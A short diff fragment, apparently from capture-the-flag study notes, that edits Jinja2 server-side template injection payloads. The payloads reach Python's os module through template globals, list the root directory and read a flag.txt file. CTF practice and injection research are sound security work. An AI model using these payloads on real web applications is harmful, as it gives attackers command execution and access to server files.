@@ -112,7 +112,7 @@ your input object基类的子类
 
 
 
-{{ config.__class__.__init__.__globals__['os'].popen('ls /').read() }}
+{{config.__class__.__init__.__globals__['os'].popen('ls /').read()}}
 {{lipsum.__globals__.get("os").popen("cd ..;cd ..;cd ..;ls;cat flag.txt").read()}}
 
 {{ }}
